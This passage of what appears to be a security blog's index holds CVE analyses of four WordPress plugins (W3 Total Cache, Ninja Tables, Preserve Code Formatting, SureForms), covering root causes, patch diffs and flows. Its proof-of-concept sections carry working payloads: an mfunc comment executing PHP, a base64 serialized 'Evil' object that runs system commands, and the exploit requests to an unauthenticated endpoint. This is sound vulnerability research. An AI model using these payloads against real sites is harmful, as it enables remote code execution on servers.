replaced with execution result\"] R --\u003e S S --\u003e T[\"Page optionally compressed\"] T --\u003e U[\"echo back to user\"]","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Install and activate the plugin. Enable Page Cache. Configure W3TC_DYNAMIC_SECURITY in wp-config.php. Comment on any post: \u003c!-- mfuncvalue --\u003ephpinfo();\u003c!-- /mfuncvalue --\u003e Result NOTE The value of W3TC_DYNAMIC_SECURITY may be exposed if you forget to enable Page Cache and use it in a place where an Unauthenticated User can see it. Used when Page Cache is forgotten to be enabled ","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE-2025-9501 arises because W3 Total Cache executes PHP in “dynamic fragment caching” (\u003c!-- mfunc ... --\u003e) via eval() without any validation or sandboxing. This allows unauthenticated attackers to inject PHP code that runs during shutdown(), after WordPress completes the main request, leading to Remote Code Execution (RCE). The risk is heightened because cache and output handling occur outside normal WordPress lifecycle, bypassing hooks, nonces, and access checks. Version 2.8.13 removes the eval() call, fixing the vulnerability. ","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:0:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Using eval() in production code almost always results in RCE if input is uncontrolled. The plugin processes dynamic content after the full WordPress lifecycle, bypassing many core protections. W3TC Page Fragment Caching allows PHP execution from HTML comments; misconfiguration or missing validation enables attacks. RCE triggers in register_shutdown_function(), executing at the end of the request, making detection harder. Immediate plugin update is mandatory for systems using \u003c= 2.8.12. Avoid eval() in PHP unless strictly sandboxed and validated. ","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:0:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Command Injection WordPress W3 Total Cache Plugin \u003c 2.8.13 is vulnerable to Remote Code Execution (RCE) ","date":"2025-11-22","objectID":"/posts/2025-11-22-cve-2025-9501/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-9501 Analysis \u0026 POC","uri":"/posts/2025-11-22-cve-2025-9501/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Ninja Tables – Easy Data Table Builder Plugin.","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The WordPress plugin Ninja Tables – Easy Data Table Builder contains a PHP Object Injection vulnerability in all versions up to 5.0.18, due to unsafe deserialization of user-provided data from the parameter args[callback]. This allows an unauthenticated attacker to supply a malicious PHP object. CVE ID: CVE-2025-2939 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 5.0.18 Patched Versions: 5.0.19 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Ninja Tables – Easy Data Table Builder Plugin ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Ninja Tables – Easy Data Table Builder: 5.0.18 – vulnerable 5.0.19 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version (v5.0.18): preserve-code-formatting.php v5.0.18 $callback = unserialize(base64_decode($params['callback'])); In this code, the unserialize() function is executed directly on user input ($params['callback'] after base64 decoding). This introduces a severe vulnerability: Object Injection Risk: If an attacker injects a serialized PHP object in base64 form, decoding and unserializing the data will instantiate the malicious object, leading to Object Injection and potential Remote Code Execution (RCE). Lack of Input Validation: No validation of the data is performed before calling unserialize. No fallback mechanism: If the supplied data is invalid or malicious, no error-handling or safe alternative exists, increasing exploitability. Patched version (v5.0.19): Patch change unserialize() was replaced with json_decode(): Removing unserialize() eliminates the possibility of PHP Object Injection. ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis getCallback() is invoked inside the registerAsyncRequestHandler() function: Client.php public static function registerAsyncRequestHandler() { $action = static::makeAsyncRequestAction(); App::addAction(\"admin_post_nopriv_{$action}\", function() { $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); $client = Client::make($requestUrl); $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; $callback = static::getCallback($params); ... }); } The function registers an Ajax endpoint for unauthenticated users (admin_post_nopriv_) and retrieves the action value using makeAsyncRequestAction(): protected static function makeAsyncRequestAction() { return 'wpf-async-request-'.sha1( App::config()-\u003eget('app.slug') ); } This returns \"wpf-async-request-\" concatenated with the SHA1 hash of the plugin slug. Since the plugin slug is ninja-tables, the final value becomes: wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 $params contains all data within args[...] from the request, after removing the control fields (action, args.url, args.method). =\u003e When a request is sent to /wp-admin/admin-post.php with action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77, then getCallback($params) is executed. ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=base64_payload\"] --\u003e B[\"WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\"] B --\u003e C[\"Plugin handler calls getCallback($params)\"] C --\u003e D[\"Decode base64 and unserialize payload\"] D --\u003e E[\"Malicious object instantiated → RCE\"] graph TD A[\"Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=base64_payload\"] --\u003e B[\"WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\"] B --\u003e C[\"Plugin handler calls getCallback($params)\"] C --\u003e D[\"Decode base64 and unserialize payload\"] D --\u003e E[\"Malicious object instantiated → RCE\"] graph TD A[\"Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=base64_payload\"] --\u003e B[\"WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\"] B --\u003e C[\"Plugin handler calls getCallback($params)\"] C --\u003e D[\"Decode base64 and unserialize payload\"] D --\u003e E[\"Malicious object instantiated → RCE\"] graph TD A[\"Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=base64_payload\"] --\u003e B[\"WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\"] B --\u003e C[\"Plugin handler calls getCallback($params)\"] C --\u003e D[\"Decode base64 and unserialize payload\"] D --\u003e E[\"Malicious object instantiated → RCE\"] ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a class for testing in wp-config.php class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Let the request pass through BurpSuite proxy Resend the request with args[callback] containing a serialized payload encoded in base64 args[callback] = base64_encode('O:4:\"Evil\":1:{s:7:\"command\";s:4:\"ls /\";}') GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[callback]=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ== HTTP/1.1 Host: localhost Kết quả ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion Versions \u003c= 5.0.18 of the Ninja Tables plugin handle the args[callback] parameter insecurely, executing unserialize() on user input without any validation. This allows an unauthenticated attacker to supply a serialized object payload and achieve code execution on the server. The 5.0.19 update completely removes the use of unserialize() and replaces it with json_decode, fully resolving the issue. ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways unserialize() must not be used on client-supplied input without validation. The Ajax hook admin_post_nopriv_* exposes an attack surface to unauthenticated users. A single crafted HTTP request is enough to trigger exploitation. Version 5.0.19 correctly mitigates the issue by switching to a safer format such as JSON. ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Deserialization WordPress Ninja Tables – Easy Data Table Builder Plugin \u003c= 5.0.18 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-21","objectID":"/posts/2025-11-21-cve-2025-2939/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-2939 Analysis \u0026 POC","uri":"/posts/2025-11-21-cve-2025-2939/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Preserve Code Formatting Plugin.","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Deserialization of Untrusted Data vulnerability in Scott Reilly’s Preserve Code Formatting plugin (preserve-code-formatting) allows Object Injection. This issue affects Preserve Code Formatting versions from n/a up to \u003c= 4.0.1. CVE ID: CVE-2025-53572 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 4.0.1 Patched Versions: 5.0 CVSS Severity: High (8.8) Required Privilege: Contributor Product: WordPress Preserve Code Formatting Plugin ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – Preserve Code Formatting: 4.0.1 – vulnerable 5.0 – patched Diff Tool (diff) → Meld or any other diff tool. ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version (v4.0.1): preserve-code-formatting.php v4.0.1 $data = unserialize( str_replace( $this-\u003echunk_split_token, '', stripslashes( base64_decode( $match[2] ) ) ) ); In this code, the unserialize() function is executed directly on user-supplied input ($match[2] after Base64 decoding). This introduces a critical vulnerability: Object Injection risk: If an attacker injects a malicious serialized PHP object encoded in Base64, decoding and unserializing will instantiate the malicious object, leading to Object Injection and potentially Remote Code Execution (RCE). No validation: There are no checks in place to validate the data before calling unserialize(). No fallback mechanism: If the data is malformed or fails to decode, the application does not handle errors safely, increasing exploitability. Patched version (v5.0): Patch changes unserialize() was replaced with json_decode(): preserve-code-formatting.php v5.0 $decoded_data = str_replace( $this-\u003echunk_split_token, '', stripslashes( base64_decode( $matches[2] ) ) ); if ( ! $this-\u003eis_content_safe( $decoded_data ) ) { return $matches[0]; } $data = json_decode( $decoded_data, true ); if ( $data === null \u0026\u0026 json_last_error() !== JSON_ERROR_NONE ) { $data = $decoded_data; } Removing unserialize() completely eliminates the possibility of PHP Object Injection. ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers the following filter: add_filter( 'content_save_pre', array( $this, 'preserve_postprocess' ), 100 ); The content_save_pre hook is executed before a post’s content is written to the database. This makes it an ideal point to modify or filter content. When triggered, the callback preserve_postprocess is executed: preserve-code-formatting.php v4.0.1 public function preserve_postprocess( $content, $preserve = false ) { $options = $this-\u003eget_options(); $preserve_tags = (array) $options['preserve_tags']; $wrap_multiline_code_in_pre = (bool) $options['wrap_multiline_code_in_pre']; $result = ''; foreach ( $preserve_tags as $tag ) { if ( $result ) { $content = $result; $result = ''; } $codes = preg_split( \"/(\\\\{\\\\!\\\\{{$tag}[^\\\\]]*\\\\}\\\\!\\\\}.*\\\\{\\\\!\\\\{\\\\/{$tag}\\\\}\\\\!\\\\})/Us\", $content, -1, PREG_SPLIT_DELIM_CAPTURE ); foreach ( $codes as $code ) { if ( preg_match( \"/\\\\{\\\\!\\\\{({$tag}[^\\\\]]*)\\\\}\\\\!\\\\}(.*)\\\\{\\\\!\\\\{\\\\/{$tag}\\\\}\\\\!\\\\}/Us\", $code, $match ) ) { // Note: base64_decode is only being used to decode user-supplied content of code tags which // had been encoded earlier in the filtering process to prevent modification by WP. $data = unserialize( str_replace( $this-\u003echunk_split_token, '', stripslashes( base64_decode( $match[2] ) ) ) ); if ( $preserve ) { $data = $this-\u003epreserve_code_formatting( $data ); } $code = \"\u003c{$match[1]}\u003e$data\u003c/$tag\u003e\"; if ( $preserve \u0026\u0026 $wrap_multiline_code_in_pre \u0026\u0026 ( 'pre' != $tag ) \u0026\u0026 preg_match( \"/\\n/\", $data ) ) { $code = '\u003cpre\u003e' . $code . '\u003c/pre\u003e'; } } $result .= $code; } } return $result; } Set a breakpoint at the beginning of preserve_postprocess() and create a new post: Post creation request POST /wp-json/wp/v2/posts/129?_locale=user HTTP/1.1 Host: localhost Cookie: wp-settings-time-3=1763365761; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1763781752%7CrF6XPHmgOzitm7TUKbUcETuuvC9pvGNPsT8bVNxQqoq%7Ce8636ff63b4bdcb466fcd689a839fd0442c9a94b6124977d2dd911a0c0fbf0de; wp-settings-2=libraryContent%3Dbrowse; wp-settings-time-2=1763608953 ... {\"id\":129,\"content\":\"\u003c!-- wp:paragraph --\u003e\\n\u003cp\u003ePayload\u003c/p\u003e\\n\u003c!-- /wp:paragraph --\u003e\",\"title\":\"Test\",\"status\":\"pending\"} Value of $content $content matches the value supplied in the \"content\" field. $codes = preg_split( \"/(\\{\\!\\{{$tag}[^\\]]*\\}\\!\\}.*\\{\\!\\{\\/{$tag}\\}\\!\\})/Us\", $content, -1, PREG_SPLIT_DELIM_CAPTURE ); This regex locates the custom preserve tag blocks {!{$tag}...}!} and their matching closing tags. PREG_SPLIT_DELIM_CAPTURE ensures the matching blocks are preserved in the output array. Value of $tag If $tag is code or pre, the preserve sections will be extracted; otherwise, the original content remains unchanged. if ( preg_match( \"/\\\\{\\\\!\\\\{({$tag}[^\\\\]]*)\\\\}\\\\!\\\\}(.*)\\\\{\\\\!\\\\{\\\\/{$tag}\\\\}\\\\!\\\\}/Us\", $code, $match ) ) { ... } preg_match() checks for a preserve block within $code. $match[1] → tag or attributes $match[2] → block content Value of $match $data = unserialize( str_replace( $this-\u003echunk_split_token, '', stripslashes( base64_decode( $match[2] ) ) ) ); Finally, $match[2] is Base64 decoded, stripped, cleaned, and then passed into unserialize(). As described in the CVE, exploitation requires Contributor privileges to create a post. ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Contributor submits Post (Content contains malicious Base64 payload)\"] --\u003e B[\"WordPress calls hook: content_save_pre\"] B --\u003e C[\"Plugin callback: preserve_postprocess()\"] C --\u003e D[\"Regex extracts preserve blocks\"] D --\u003e E[\"match[2] = Base64 payload\"] E --\u003e F[\"base64_decode()\"] F --\u003e G[\"stripslashes()\"] G --\u003e H[\"str_replace(chunk_split_token)\"] H --\u003e I[\"unserialize() on user data (VULNERABLE)\"] I --\u003e J[RCE] graph TD A[\"Contributor submits Post (Content contains malicious Base64 payload)\"] --\u003e B[\"WordPress calls hook: content_save_pre\"] B --\u003e C[\"Plugin callback: preserve_postprocess()\"] C --\u003e D[\"Regex extracts preserve blocks\"] D --\u003e E[\"match[2] = Base64 payload\"] E --\u003e F[\"base64_decode()\"] F --\u003e G[\"stripslashes()\"] G --\u003e H[\"str_replace(chunk_split_token)\"] H --\u003e I[\"unserialize() on user data (VULNERABLE)\"] I --\u003e J[RCE] graph TD A[\"Contributor submits Post (Content contains malicious Base64 payload)\"] --\u003e B[\"WordPress calls hook: content_save_pre\"] B --\u003e C[\"Plugin callback: preserve_postprocess()\"] C --\u003e D[\"Regex extracts preserve blocks\"] D --\u003e E[\"match[2] = Base64 payload\"] E --\u003e F[\"base64_decode()\"] F --\u003e G[\"stripslashes()\"] G --\u003e H[\"str_replace(chunk_split_token)\"] H --\u003e I[\"unserialize() on user data (VULNERABLE)\"] I --\u003e J[RCE] graph TD A[\"Contributor submits Post (Content contains malicious Base64 payload)\"] --\u003e B[\"WordPress calls hook: content_save_pre\"] B --\u003e C[\"Plugin callback: preserve_postprocess()\"] C --\u003e D[\"Regex extracts preserve blocks\"] D --\u003e E[\"match[2] = Base64 payload\"] E --\u003e F[\"base64_decode()\"] F --\u003e G[\"stripslashes()\"] G --\u003e H[\"str_replace(chunk_split_token)\"] H --\u003e I[\"unserialize() on user data (VULNERABLE)\"] I --\u003e J[RCE] ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a test class in wp-config.php: class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } Create a post and intercept the request using Burp Suite. Resend the request with the \"content\" field containing the serialized and Base64-encoded payload: Result ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion Versions \u003c= 4.0.1 of the Preserve Code Formatting plugin are critically vulnerable because unserialize() is called on unvalidated user input. With only Contributor privileges, an attacker can inject a malicious payload that is deserialized during post processing, leading to remote code execution or unauthorized system manipulation. The v5.0 patch eliminates unserialize(), replaces it with json_decode(), and adds input validation, effectively neutralizing the Object Injection attack surface. ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Using unserialize() on user-controlled data is fundamentally unsafe without strict validation. The content_save_pre hook exposes an attack surface because input is processed before sanitization. Contributor privileges are sufficient to exploit the issue in multi-user environments. The patch focuses on switching to safe data handling and applying content validation. Replacing unserialize() with safer mechanisms like JSON is the correct fix for WordPress plugins facing similar issues. ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Deserialization WordPress Preserve Code Formatting Plugin \u003c= 4.0.1 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-20","objectID":"/posts/2025-11-20-cve-2025-49386/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-20-cve-2025-49386/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress SureForm Plugin.","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The SureForms – Drag and Drop Form Builder for WordPress plugin for WordPress contains a PHP Object Injection vulnerability in all versions up to and including 1.7.3 due to the usage of file_exists() in the delete_entry_files() function without restricting the provided path. This allows an unauthenticated attacker to inject a PHP Object. No POP chain is known in the vulnerable software, meaning the vulnerability has no impact unless another plugin or theme installed on the site contains a POP chain. If such a POP chain exists via additional plugins or themes installed on the target system, it may allow the attacker to perform actions such as arbitrary file deletion, sensitive data exposure, or code execution depending on the POP chain present. CVE ID: CVE-2025-6742 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 1.7.3 Patched Versions: 1.7.4 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress SureForm Plugin ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - SureForm: 1.7.3 – vulnerable 1.7.4 – patched Diff Tool (diff) → Meld or any diffing tool. ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In version 1.7.3, the function delete_entry_files() receives a $file_url, then decodes the URL and converts it into a path using $file_path = Helper::convert_fileurl_to_filepath( urldecode( $file_url ) ); It then directly calls: entries-list-table.php v1.7.3 // Delete the file if it exists. if ( file_exists( $file_path ) ) { unlink( $file_path ); } This code checks for file existence using file_exists() and uses unlink() to delete it if present. Changes in the patch In the patched version, the code is replaced with: entries-list-table.php v1.7.4 // Delete the file from the uploads directory. Helper::delete_upload_file_from_subdir( $file_url, 'sureforms/' ); helper.php v1.7.4 public static function delete_upload_file_from_subdir( $file_url, $subdir = 'sureforms/' ) { // Decode the file URL. $file_url = urldecode( $file_url ); // Check if the file URL is empty. if ( empty( $file_url ) || ! is_string( $file_url ) ) { return false; } // Normalize and sanitize the subdirectory. $subdir = trailingslashit( sanitize_text_field( $subdir ) ); // Get the base upload directory. $upload_dir = wp_upload_dir(); $base_upload_path = trailingslashit( $upload_dir['basedir'] ) . $subdir; // Extract only the filename from URL. $filename = basename( $file_url ); // Construct the full file path. $file_path = $base_upload_path . $filename; // Resolve real paths. $real_file_path = realpath( $file_path ); $real_base_path = realpath( $base_upload_path ); // Security check: ensure file is inside the target subdir. if ( ! $real_file_path || ! $real_base_path || strpos( $real_file_path, $real_base_path ) !== 0 ) { return false; } // Delete if file exists. if ( file_exists( $real_file_path ) ) { return unlink( $real_file_path ); } return false; } The new function delete_upload_file_from_subdir() performs multiple security checks, only allowing deletion of files located in the uploads/sureforms/ directory with valid filenames. According to the description, this CVE is related to a PHP Object Injection vulnerability where the sink is the file_exists() function, which only occurs in the case of PHAR Deserialization, meaning $file_path must be in the format phar://phar_file. ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis entries-list-table.php v1.7.3 public static function delete_entry_files( $entry_id ) { if ( ! $entry_id ) { return; } // Get the entry data to get the file URLs. $form_data = Entries::get_form_data( $entry_id ); if ( empty( $form_data ) ) { return; } foreach ( $form_data as $field_name =\u003e $value ) { // Continue to the next iteration if the field name does not contain 'srfm-upload' and value is not an array. if ( false === strpos( $field_name, 'srfm-upload' ) \u0026\u0026 ! is_array( $value ) ) { continue; } foreach ( $value as $file_url ) { // If the file URL is empty, skip to the next iteration. if ( empty( $file_url ) ) { continue; } $file_path = Helper::convert_fileurl_to_filepath( urldecode( $file_url ) ); // Delete the file if it exists. if ( file_exists( $file_path ) ) { unlink( $file_path ); } } } ... } After reviewing the logic in delete_entry_files(), I noticed keywords like entries appear frequently. There is a coincidence here: Entry in UI It seems correct, but as you can see the message \"No records found\", there is no data to display. So how do we add data? $form_data = Entries::get_form_data( $entry_id ); Looking at the function name get_form_data, it is highly likely that data is retrieved from client form submissions since this vulnerability is published as Unauthenticated. Try creating a form using the plugin functionality: Create form Create a post and embed the form shortcode: Embed Shortcode Access the created form and submit arbitrary data: Request POST /wp-json/sureforms/v1/submit-form?_locale=user HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0 Accept: application/json, */*;q=0.1 Accept-Language: en-US,en;q=0.7,vi;q=0.3 Accept-Encoding: gzip, deflate, br Referer: http://localhost/2025/11/19/form-testing/ X-WP-Nonce: 2c506366a5 Content-Type: multipart/form-data; boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Length: 730 Origin: http://localhost Connection: keep-alive Cookie: wp-settings-time-3=1763365761 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin X-PwnFox-Color: blue Priority: u=0 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"sureforms_form_submit\" d3b9273370 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"_wp_http_referer\" /2025/11/19/form-testing/ ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"form-id\" 123 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-sender-email-field\" ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field\" testing ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221-- Submit form from Unauthenticated user The response returns several fields such as status and submission id. The name delete_entry_files refers to deleting an entry, so let’s set a breakpoint at the start of the function and try deleting an entry. Debugger when entry is deleted Continue debugging Value of $value We see $value is attacker-controlled. $value needs to be an array so it won’t be skipped by continue and so file_exists() can be invoked. To make $value an array, submit a field whose name ends with []: ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]\" testing Value of $value ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow After debugging, we can see the execution flow to the sink: graph TD A[\"Client submit form\"] --\u003e B[\"Admin delete entry\"] B --\u003e C[\"WordPress hook: admin_init\"] C --\u003e D[\"handle_entry_actions\"] D --\u003e E[\"Entries_List_Table::handle_entry_status()\"] E -- $action=delete --\u003e F[\"Entries_List_Table::delete_entry_files()\"] F --\u003e G{\"$value is array\"} G -- Yes --\u003e H[\"call file_exists( $file_path )\"] --\u003e L[\"RCE: PHAR Deserialization\"] G -- No --\u003e K[\"continue\"] graph TD A[\"Client submit form\"] --\u003e B[\"Admin delete entry\"] B --\u003e C[\"WordPress hook: admin_init\"] C 